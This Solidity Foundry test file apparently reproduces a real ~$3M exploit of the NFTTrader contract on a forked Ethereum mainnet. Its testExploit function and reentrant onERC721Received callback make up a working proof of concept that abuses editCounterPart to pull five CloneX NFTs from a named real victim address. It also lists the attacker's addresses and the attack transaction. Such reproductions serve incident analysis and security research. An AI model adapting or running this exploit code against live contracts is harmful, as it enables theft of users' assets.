// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~3M (info from hacked.slowmist.io)
// Attacker : https://etherscan.io/address/0xb1edf2a0ba8bc789cbc3dfbe519737cada034d2d
// Attacker Contract : https://etherscan.io/address/0x871f28e58f2a0906e4a56a82aec7f005b411f5c5
// Vulnerable Contract : https://etherscan.io/address/0xc310e760778ecbca4c65b6c559874757a4c4ece0
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d

// @Analysis
// https://twitter.com/AnciliaInc/status/1736263884217139333
// https://twitter.com/SlowMist_Team/status/1736005523550646535
// https://twitter.com/0xArhat/status/1736038250190651467

interface IUniV3PosNFT {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function setApprovalForAll(address operator, bool approved) external;

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) external;

    function mint(
        MintParams memory params
    )
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        );
}

interface INFTTrader {
    struct swapIntent {
        uint256 id;
        address addressOne;
        uint256 valueOne;
        address addressTwo;
        uint256 valueTwo;
        uint256 swapStart;
        uint256 swapEnd;
        uint256 swapFee;
        uint8 status;
    }

    struct swapStruct {
        address dapp;
        address typeStd;
        uint256[] tokenId;
        uint256[] blc;
        bytes data;
    }

    function closeSwapIntent(
        address _swapCreator,
        uint256 _swapId
    ) external payable;

    function createSwapIntent(
        swapIntent memory _swapIntent,
        swapStruct[] memory _nftsOne,
        swapStruct[] memory _nftsTwo
    ) external payable;

    function editCounterPart(uint256 _swapId, address _counterPart) external;
}

contract ContractTest is Test {
    IUSDC private constant USDC =
        IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH private constant WETH =
        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniV3PosNFT private constant UniV3PosNFT =
        IUniV3PosNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    INFTTrader private constant NFTTrader =
        INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0);
    IERC721 private constant CloneX =
        IERC721(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B);
    address private constant victim =
        0x23938954BC875bb8309AEF15e2Dead54884B73Db;
    address private constant tradeSquad =
        0x58874d2951524F7f851bbBE240f0C3cF0b992d79;
    uint256 private swapId;

    function setUp() public {
        vm.createSelectFork("mainnet", 18799414);
        vm.label(address(UniV3PosNFT), "UniV3PosNFT");
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(NFTTrader), "NFTTrader");
        vm.label(address(CloneX), "CloneX");
        vm.label(victim, "Victim");
        vm.label(tradeSquad, "tradeSquad");
    }

    function testExploit() public {
        deal(address(this), 0.001 ether);

        IUniV3PosNFT.MintParams memory params = IUniV3PosNFT.MintParams({
            token0: address(USDC),
            token1: address(WETH),
            fee: 500,
            tickLower: 0,
            tickUpper: 100_000,
            amount0Desired: 0,
            amount1Desired: address(this).balance,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp
        });

        (uint256 positionId, , , ) = UniV3PosNFT.mint{
            value: address(this).balance
        }(params);

        vm.roll(18799435);
        deal(address(this), 0.1 ether);
        UniV3PosNFT.setApprovalForAll(address(CloneX), true);

        vm.roll(18799487);
        UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);
        require(CloneX.isApprovedForAll(victim, address(NFTTrader)));

        emit log_named_uint(
            "Victim CloneX balance before attack",
            CloneX.balanceOf(victim)
        );

        emit log_named_uint(
            "Exploiter CloneX balance before attack",
            CloneX.balanceOf(address(this))
        );

        uint256[] memory victimsCloneXTokenIds = new uint256[](
            CloneX.balanceOf(victim)
        );
        victimsCloneXTokenIds[0] = 6_670;
        victimsCloneXTokenIds[1] = 6_650;
        victimsCloneXTokenIds[2] = 4_843;
        victimsCloneXTokenIds[3] = 5_432;
        victimsCloneXTokenIds[4] = 9_870;

        for (uint8 i; i < victimsCloneXTokenIds.length; ++i) {
            INFTTrader.swapIntent memory _swapIntent = INFTTrader.swapIntent({
                id: 0,
                addressOne: address(0),
                valueOne: 0,
                addressTwo: address(this),
                valueTwo: 0,
                swapStart: 0,
                swapEnd: 0,
                swapFee: 0,
                status: 0
            });

            INFTTrader.swapStruct[]
                memory _nftsOne = new INFTTrader.swapStruct[](0);
            INFTTrader.swapStruct[]
                memory _nftsTwo = new INFTTrader.swapStruct[](2);
            uint256[] memory _tokenId1 = new uint256[](1);
            _tokenId1[0] = positionId;
            uint256[] memory _blc = new uint256[](0);
            _nftsTwo[0] = INFTTrader.swapStruct({
                dapp: address(UniV3PosNFT),
                typeStd: tradeSquad,
                tokenId: _tokenId1,
                blc: _blc,
                data: ""
            });

            uint256[] memory _tokenId2 = new uint256[](1);
            _tokenId2[0] = victimsCloneXTokenIds[i];
            _nftsTwo[1] = INFTTrader.swapStruct({
                dapp: address(CloneX),
                typeStd: tradeSquad,
                tokenId: _tokenId2,
                blc: _blc,
                data: ""
            });
            vm.recordLogs();
            NFTTrader.createSwapIntent{value: 0.005 ether}(
                _swapIntent,
                _nftsOne,
                _nftsTwo
            );
            Vm.Log[] memory entries = vm.getRecordedLogs();
            (swapId, ) = abi.decode(entries[0].data, (uint256, address));
            NFTTrader.closeSwapIntent{value: 0.005 ether}(
                address(this),
                swapId
            );
        }

        for (uint8 j; j < victimsCloneXTokenIds.length; ++j) {
            assertEq(CloneX.ownerOf(victimsCloneXTokenIds[j]), address(this));
        }

        emit log_named_uint(
            "Victim CloneX balance after attack",
            CloneX.balanceOf(victim)
        );

        emit log_named_uint(
            "Exploiter CloneX balance after attack",
            CloneX.balanceOf(address(this))
        );
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // Flawed function. Lack of reentrancy protection
        NFTTrader.editCounterPart(swapId, victim);
        return this.onERC721Received.selector;
    }
}
